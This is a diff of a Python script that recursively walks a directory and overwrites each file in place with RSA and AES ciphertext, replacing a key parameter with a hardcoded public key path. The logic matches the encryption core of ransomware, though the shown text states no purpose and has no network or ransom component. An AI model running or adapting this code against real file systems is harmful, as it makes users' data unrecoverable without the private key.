@@ -4,13 +4,13 @@ from Cryptodome.Random import get_random_bytes
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 import os
 import sys
-def Encrypt(filename,keydata):         
+def Encrypt(filename):         
     data = ''
     with open(filename, 'rb') as f:
         data = f.read()
     with open(filename, 'wb') as out_file:
         # 收件人秘钥 - 公钥
-        recipient_key = RSA.importKey(keydata)
+        recipient_key = RSA.importKey(open('../Encrypt_And_Decrypt/my_public_rsa_key.pem').read())
         session_key = get_random_bytes(16)
         # Encrypt the session key with the public RSA key
         cipher_rsa = PKCS1_OAEP.new(recipient_key)
@@ -22,11 +22,11 @@ def Encrypt(filename,keydata):
         out_file.write(tag)
         out_file.write(ciphertext)
 
-def Work_Encrypt(rootDir,key): 
+def Work_Encrypt(rootDir): 
     list_dirs = os.walk(rootDir) 
     for root, dirs, files in list_dirs: 
         if True:
             for f in files: 
                 filename = os.path.join(root, f)
                 print("Encrypt the file: " + filename)
-                Encrypt(filename,key)
+                Encrypt(filename)
